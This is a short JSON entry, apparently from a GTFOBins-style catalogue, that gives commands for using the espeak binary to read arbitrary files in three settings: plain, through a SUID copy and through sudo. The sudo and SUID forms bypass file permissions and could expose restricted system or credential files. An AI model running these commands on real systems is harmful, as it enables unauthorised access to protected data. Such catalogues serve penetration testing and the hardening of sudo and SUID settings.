{
  "functions": {
    "file-read": [
      {
        
        "code": "LFILE=file_to_read\nespeak -qXf \"$LFILE\"\n"
      }
    ],
    "suid": [
      {
        
        "code": "LFILE=file_to_read\n./espeak -qXf \"$LFILE\"\n"
      }
    ],
    "sudo": [
      {
        
        "code": "LFILE=file_to_read\nsudo espeak -qXf \"$LFILE\"\n"
      }
    ]
  }
}
